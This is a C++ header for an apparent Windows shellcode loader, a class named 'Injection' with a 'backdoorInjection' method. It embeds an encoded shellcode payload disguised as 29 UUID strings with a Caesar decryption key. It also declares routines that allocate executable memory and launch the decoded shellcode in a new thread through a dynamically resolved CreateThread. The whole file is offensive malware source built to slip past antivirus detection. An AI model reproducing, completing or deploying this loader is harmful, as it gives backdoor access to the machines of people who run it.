#pragma once
#define INCLUDE_MYCLASS 0

#if INCLUDE_MYCLASS

#include <windows.h>
#include <iostream>
#include <vector>
#include <string>
#include <sstream>
#include <iomanip>
#include "system_utils\WinAPIWrapper.h"

typedef HANDLE(WINAPI* CreateThreadFunc)(LPSECURITY_ATTRIBUTES,SIZE_T,LPTHREAD_START_ROUTINE,LPVOID,DWORD,LPDWORD);

class Injection {
public:
	Injection();
	VOID backdoorInjection(void);
	VOID printShellcode();

	int key = 0xDE;

	std::vector<unsigned char> shellcode;
	std::vector<std::string> uuid_shellcode_vector = {
		"da2661c2-cec6-9ede-dede-1f2f1f2e302f",
		"34260fb0-4326-6930-3e26-6930f6266930",
		"fe266950-2e26-ed95-2828-2b0fa7260f9e",
		"8a1a3f5a-e00a-fe1f-9fa7-eb1fdf9fc0cb",
		"301f2f26-6930-fe69-201a-26dfae695e66",
		"dedede26-639e-5245-26df-ae2e6926f622",
		"691efe27-dfae-c134-26dd-a71f69126626",
		"dfb42b0f-a726-0f9e-8a1f-9fa7eb1fdf9f",
		"16be53cf-2ae1-2a02-e623-17af53b63622",
		"691e0227-dfae-441f-69ea-2622691efa27",
		"dfae1f69-e266-26df-ae1f-361f363c3738",
		"1f361f37-1f38-2661-cafe-1f30ddbe361f",
		"37382669-f0c7-35dd-dddd-3b279c555110",
		"3d1110de-de1f-3427-67c4-265fca7edfde",
		"de2767c3-279a-e0de-ef3a-9e86df391f32",
		"2767c22a-67cf-1f98-2a55-04e5ddb32a67",
		"c846dfdf-dede-371f-9807-5e49deddb32e",
		"2e2b0fa7-2b0f-9e26-dd9e-2667a026dd9e",
		"26679f1f-98c8-edbd-bedd-b32667a548ee",
		"1f362a67-c026-67d7-1f98-7783523fddb3",
		"265fa21e-e0de-de27-9641-4b42dededede",
		"de1f2e1f-2e26-67c0-3535-352b0f9e48eb",
		"371f2ec0-da44-a522-0232-dfdf266b2202",
		"f6a4de46-2667-c434-2e1f-2e1f2e1f2e27",
		"dd9e1f2e-27dd-a62b-679f-2a679f1f9857",
		"aa1d64dd-b326-0fb0-26dd-a869ec1f98e6",
		"65fb3edd-b399-ce93-8034-1f9884739b7b",
		"ddb32661-a206-1ae4-5ae8-5ed9be53e399",
		"25f1504d-48de-371f-67b8-ddb36e6e6e6e",
	};
private:

	VOID						_cleanUpResources(HANDLE hThread, PVOID shellcode_exec);
	PVOID						_allocateExecutableMemory(SIZE_T size);
	CreateThreadFunc			_getCreateThreadFunction(void);
	HANDLE						_createShellcodeThread(PVOID shellcode_exec, DWORD& threadID);
	std::vector<unsigned char>	_uuidListToShellcode(const std::vector<std::string>& uuidList);
	VOID						_caesarDecrypt(std::vector<unsigned char>& data, unsigned char key);
	/*
	VOID						_caesarEncrypt(std::vector<unsigned char>& data, unsigned char key);
	*/
	std::vector<unsigned char>	_hexStringToBytes(const std::string& hex);
	WinAPIWrapper				_API;
};
#endif
